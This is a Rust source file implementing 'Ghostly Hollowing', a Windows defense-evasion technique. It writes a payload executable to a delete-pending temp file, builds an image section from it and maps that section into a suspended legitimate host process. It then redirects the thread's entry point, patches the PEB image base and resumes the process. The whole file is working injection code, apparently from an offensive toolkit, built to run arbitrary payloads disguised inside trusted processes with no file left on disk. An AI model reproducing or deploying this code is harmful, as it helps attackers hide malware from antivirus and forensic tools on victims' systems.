use std::ffi::CString;
use std::path::Path;

use windows::core::PCSTR;
use windows::Win32::Foundation::{CloseHandle, HANDLE};
use windows::Win32::System::Diagnostics::Debug::{
    GetThreadContext, SetThreadContext, WriteProcessMemory, CONTEXT, CONTEXT_FULL_AMD64,
};
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows::Win32::System::Threading::{
    CreateProcessW, ResumeThread, TerminateProcess, CREATE_NEW_CONSOLE, CREATE_SUSPENDED,
    PROCESS_INFORMATION, STARTUPINFOW,
};

use crate::error::MiscError;

/// Ghostly Hollowing: combines process ghosting with process hollowing.
///
/// Algorithm:
/// 1. Read payload PE into memory, validate PE32+ (64-bit), extract entry point RVA
/// 2. Create temp file, open via NtOpenFile with DELETE permission
/// 3. Mark file for deletion via NtSetInformationFile(FileDispositionInformation)
/// 4. Write payload bytes to the delete-pending file via NtWriteFile
/// 5. Create SEC_IMAGE section from the file via NtCreateSection
/// 6. Close file handle (triggers deletion — section survives as orphan)
/// 7. Create a legitimate host process SUSPENDED via CreateProcessW
/// 8. Map the ghost section into the suspended process via NtMapViewOfSection
/// 9. Hijack thread: set RCX to mapped_base + entry_point_rva, patch PEB.ImageBase
/// 10. Resume thread — payload executes inside the legitimate process
///
/// Returns the PID of the ghostly-hollowed process on success.
///
/// # Arguments
/// * `host_path` - Path to a legitimate executable (will be created suspended, then hollowed)
/// * `payload_path` - Path to the payload PE (64-bit only) to execute via ghost section
pub fn ghostly_hollow_process(host_path: &str, payload_path: &str) -> Result<u32, MiscError> {
    // Validate both files exist
    if !Path::new(host_path).exists() {
        return Err(MiscError::FileNotFound(host_path.to_string()));
    }
    if !Path::new(payload_path).exists() {
        return Err(MiscError::FileNotFound(payload_path.to_string()));
    }

    // Read payload PE file
    let data = std::fs::read(payload_path)
        .map_err(|_| MiscError::FileReadFailed(payload_path.to_string()))?;

    // Validate PE header basics
    if data.len() < 64 {
        return Err(MiscError::InvalidPE("File too small for DOS header".into()));
    }
    let dos_magic = u16::from_le_bytes([data[0], data[1]]);
    if dos_magic != 0x5A4D {
        return Err(MiscError::InvalidPE("Invalid DOS magic (not MZ)".into()));
    }
    let pe_offset = u32::from_le_bytes([data[60], data[61], data[62], data[63]]) as usize;
    if data.len() < pe_offset + 4 {
        return Err(MiscError::InvalidPE(
            "File too small for PE signature".into(),
        ));
    }
    let pe_sig = u32::from_le_bytes([
        data[pe_offset],
        data[pe_offset + 1],
        data[pe_offset + 2],
        data[pe_offset + 3],
    ]);
    if pe_sig != 0x00004550 {
        return Err(MiscError::InvalidPE("Invalid PE signature".into()));
    }

    // Check PE32+ (64-bit)
    let coff_offset = pe_offset + 4;
    if data.len() < coff_offset + 20 {
        return Err(MiscError::InvalidPE(
            "File too small for COFF header".into(),
        ));
    }
    let opt_offset = coff_offset + 20;
    if data.len() < opt_offset + 20 {
        return Err(MiscError::InvalidPE(
            "File too small for optional header".into(),
        ));
    }
    let opt_magic = u16::from_le_bytes([data[opt_offset], data[opt_offset + 1]]);
    if opt_magic != 0x20b {
        return Err(MiscError::ArchMismatch(
            "Only PE32+ (64-bit) executables are supported for ghostly hollowing".into(),
        ));
    }

    // Get entry point RVA
    let entry_point_rva = u32::from_le_bytes([
        data[opt_offset + 16],
        data[opt_offset + 17],
        data[opt_offset + 18],
        data[opt_offset + 19],
    ]);

    if entry_point_rva == 0 {
        return Err(MiscError::InvalidPE("Entry point RVA is zero".into()));
    }

    unsafe {
        // Resolve NT functions from ntdll
        let ntdll = GetModuleHandleA(PCSTR(b"ntdll.dll\0".as_ptr()))
            .map_err(|_| {
                MiscError::GhostlyHollowFailed("Failed to get ntdll.dll handle".into())
            })?;

        let get_proc = |name: &str| -> Result<*const (), MiscError> {
            let cname = CString::new(name).unwrap();
            GetProcAddress(ntdll, PCSTR(cname.as_ptr() as *const u8))
                .map(|p| p as *const ())
                .ok_or_else(|| {
                    MiscError::GhostlyHollowFailed(format!("Failed to resolve {}", name))
                })
        };

        // ---- NT API struct definitions ----

        #[repr(C)]
        struct UnicodeString {
            length: u16,
            maximum_length: u16,
            buffer: *mut u16,
        }

        impl UnicodeString {
            fn from_wide(wide: &[u16]) -> Self {
                let byte_len = ((wide.len().saturating_sub(1)) * 2) as u16;
                Self {
                    length: byte_len,
                    maximum_length: byte_len + 2,
                    buffer: wide.as_ptr() as *mut u16,
                }
            }
        }

        #[repr(C)]
        struct ObjectAttributes {
            length: u32,
            root_directory: HANDLE,
            object_name: *mut UnicodeString,
            attributes: u32,
            security_descriptor: *mut std::ffi::c_void,
            security_quality_of_service: *mut std::ffi::c_void,
        }

        #[repr(C)]
        struct IoStatusBlock {
            status: i32,
            _pad: u32,
            information: usize,
        }

        // ---- Function type definitions ----

        type NtOpenFileFn = unsafe extern "system" fn(
            *mut HANDLE,
            u32,
            *mut ObjectAttributes,
            *mut IoStatusBlock,
            u32,
            u32,
        ) -> i32;

        type NtSetInformationFileFn = unsafe extern "system" fn(
            HANDLE,
            *mut IoStatusBlock,
            *mut std::ffi::c_void,
            u32,
            u32,
        ) -> i32;

        type NtWriteFileFn = unsafe extern "system" fn(
            HANDLE,
            HANDLE,
            *mut std::ffi::c_void,
            *mut std::ffi::c_void,
            *mut IoStatusBlock,
            *const u8,
            u32,
            *mut i64,
            *mut u32,
        ) -> i32;

        type NtCreateSectionFn = unsafe extern "system" fn(
            *mut HANDLE,
            u32,
            *mut std::ffi::c_void,
            *mut i64,
            u32,
            u32,
            HANDLE,
        ) -> i32;

        type NtMapViewOfSectionFn = unsafe extern "system" fn(
            HANDLE,
            HANDLE,
            *mut *mut std::ffi::c_void,
            usize,
            usize,
            *mut i64,
            *mut usize,
            u32,
            u32,
            u32,
        ) -> i32;

        // ---- Resolve all NT functions ----
        let nt_open_file: NtOpenFileFn = std::mem::transmute(get_proc("NtOpenFile")?);
        let nt_set_information_file: NtSetInformationFileFn =
            std::mem::transmute(get_proc("NtSetInformationFile")?);
        let nt_write_file: NtWriteFileFn = std::mem::transmute(get_proc("NtWriteFile")?);
        let nt_create_section: NtCreateSectionFn =
            std::mem::transmute(get_proc("NtCreateSection")?);
        let nt_map_view_of_section: NtMapViewOfSectionFn =
            std::mem::transmute(get_proc("NtMapViewOfSection")?);

        // ==== Step 1: Create ghost section ====

        // Create temp file with unique name
        let unique_id = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_nanos())
            .unwrap_or(0);
        let temp_filename = format!("GH_{:X}.tmp", unique_id);
        let temp_path = std::env::temp_dir().join(&temp_filename);
        let temp_path_str = temp_path.to_string_lossy().to_string();

        // Create empty temp file so NtOpenFile can open it
        std::fs::File::create(&temp_path)
            .map_err(|_| MiscError::GhostlyHollowFailed("Failed to create temp file".into()))?;

        // Convert to NT path format: \??\C:\...\GHxxxx.tmp
        let nt_tmp_path = format!("\\??\\{}", temp_path_str);
        let nt_tmp_wide: Vec<u16> = nt_tmp_path
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();

        let mut file_name_us = UnicodeString::from_wide(&nt_tmp_wide);
        let mut object_attr = ObjectAttributes {
            length: std::mem::size_of::<ObjectAttributes>() as u32,
            root_directory: HANDLE::default(),
            object_name: &mut file_name_us,
            attributes: 0x40, // OBJ_CASE_INSENSITIVE
            security_descriptor: std::ptr::null_mut(),
            security_quality_of_service: std::ptr::null_mut(),
        };

        let mut io_status = IoStatusBlock {
            status: 0,
            _pad: 0,
            information: 0,
        };
        let mut file_handle = HANDLE::default();

        // NtOpenFile with DELETE | SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE
        let status = nt_open_file(
            &mut file_handle,
            0x00010000 | 0x00100000 | 0x80000000 | 0x40000000,
            &mut object_attr,
            &mut io_status,
            0x01 | 0x02, // FILE_SHARE_READ | FILE_SHARE_WRITE
            0x00000020,  // FILE_SYNCHRONOUS_IO_NONALERT
        );

        if status != 0 {
            let _ = std::fs::remove_file(&temp_path);
            return Err(MiscError::GhostlyHollowFailed(format!(
                "NtOpenFile failed with status 0x{:08X}",
                status
            )));
        }

        // Mark file for deletion (FileDispositionInformation, class 13)
        let mut delete_flag: u8 = 1; // DeleteFile = TRUE
        let status = nt_set_information_file(
            file_handle,
            &mut io_status,
            &mut delete_flag as *mut _ as *mut _,
            std::mem::size_of::<u8>() as u32,
            13, // FileDispositionInformation
        );

        if status != 0 {
            let _ = CloseHandle(file_handle);
            return Err(MiscError::GhostlyHollowFailed(format!(
                "NtSetInformationFile failed with status 0x{:08X}",
                status
            )));
        }

        // Write payload to delete-pending file via NtWriteFile
        let mut byte_offset: i64 = 0;
        let status = nt_write_file(
            file_handle,
            HANDLE::default(), // Event
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            &mut io_status,
            data.as_ptr(),
            data.len() as u32,
            &mut byte_offset,
            std::ptr::null_mut(),
        );

        if status != 0 {
            let _ = CloseHandle(file_handle);
            return Err(MiscError::GhostlyHollowFailed(format!(
                "NtWriteFile failed with status 0x{:08X}",
                status
            )));
        }

        // Create SEC_IMAGE section from the delete-pending file
        let mut section_handle = HANDLE::default();
        let status = nt_create_section(
            &mut section_handle,
            0xF001F, // SECTION_ALL_ACCESS
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0x02,      // PAGE_READONLY
            0x1000000, // SEC_IMAGE
            file_handle,
        );

        // Close file handle — triggers deletion, but section survives
        let _ = CloseHandle(file_handle);

        if status != 0 {
            return Err(MiscError::GhostlyHollowFailed(format!(
                "NtCreateSection failed with status 0x{:08X}",
                status
            )));
        }

        // ==== Step 2: Create suspended host process ====

        let cmd_line = format!("\"{}\"", host_path);
        let mut cmd_wide: Vec<u16> = cmd_line.encode_utf16().chain(std::iter::once(0)).collect();

        // Extract parent directory for working directory
        let host_dir = Path::new(host_path)
            .parent()
            .unwrap_or(Path::new("C:\\"))
            .to_string_lossy()
            .to_string();
        let host_dir_wide: Vec<u16> = host_dir
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();

        let mut startup_info: STARTUPINFOW = std::mem::zeroed();
        startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();

        let create_result = CreateProcessW(
            None,
            windows::core::PWSTR(cmd_wide.as_mut_ptr()),
            None,
            None,
            true,
            CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
            None,
            windows::core::PCWSTR(host_dir_wide.as_ptr()),
            &startup_info,
            &mut process_info,
        );

        if create_result.is_err() {
            let _ = CloseHandle(section_handle);
            return Err(MiscError::CreateProcessFailed(format!(
                "CreateProcessW failed for host {}",
                host_path
            )));
        }

        let process_handle = process_info.hProcess;
        let thread_handle = process_info.hThread;
        let pid = process_info.dwProcessId;

        let cleanup = |ph: HANDLE, th: HANDLE, sh: HANDLE| {
            let _ = TerminateProcess(ph, 1);
            let _ = CloseHandle(th);
            let _ = CloseHandle(ph);
            let _ = CloseHandle(sh);
        };

        // ==== Step 3: Map ghost section into suspended process ====

        let mut base_address: *mut std::ffi::c_void = std::ptr::null_mut();
        let mut view_size: usize = 0;

        let status = nt_map_view_of_section(
            section_handle,
            process_handle,
            &mut base_address,
            0,                    // ZeroBits
            0,                    // CommitSize
            std::ptr::null_mut(), // SectionOffset
            &mut view_size,
            2,    // ViewUnmap
            0,    // AllocationType
            0x02, // PAGE_READONLY
        );

        if status != 0 {
            cleanup(process_handle, thread_handle, section_handle);
            return Err(MiscError::GhostlyHollowFailed(format!(
                "NtMapViewOfSection failed with status 0x{:08X}",
                status
            )));
        }

        // ==== Step 4: Hijack thread execution ====

        // Get thread context — Rdx holds the PEB address
        let mut context: CONTEXT = std::mem::zeroed();
        context.ContextFlags = CONTEXT_FULL_AMD64;

        if GetThreadContext(thread_handle, &mut context).is_err() {
            cleanup(process_handle, thread_handle, section_handle);
            return Err(MiscError::GetContextFailed);
        }

        // Set RCX to entry point in mapped ghost section (thread hijacking)
        context.Rcx = base_address as u64 + entry_point_rva as u64;

        if SetThreadContext(thread_handle, &context).is_err() {
            cleanup(process_handle, thread_handle, section_handle);
            return Err(MiscError::SetContextFailed);
        }

        // Patch PEB.ImageBase (offset 0x10 from PEB at Context.Rdx)
        let peb_image_base_addr = (context.Rdx + 0x10) as *mut std::ffi::c_void;
        let new_image_base = base_address as u64;

        if WriteProcessMemory(
            process_handle,
            peb_image_base_addr,
            &new_image_base as *const _ as *const _,
            8,
            None,
        )
        .is_err()
        {
            cleanup(process_handle, thread_handle, section_handle);
            return Err(MiscError::PebReadFailed);
        }

        // ==== Step 5: Resume thread ====

        let resume_result = ResumeThread(thread_handle);
        if resume_result == u32::MAX {
            cleanup(process_handle, thread_handle, section_handle);
            return Err(MiscError::ResumeThreadFailed(process_info.dwThreadId));
        }

        // Clean up handles
        let _ = CloseHandle(section_handle);
        let _ = CloseHandle(thread_handle);
        let _ = CloseHandle(process_handle);

        Ok(pid)
    }
}
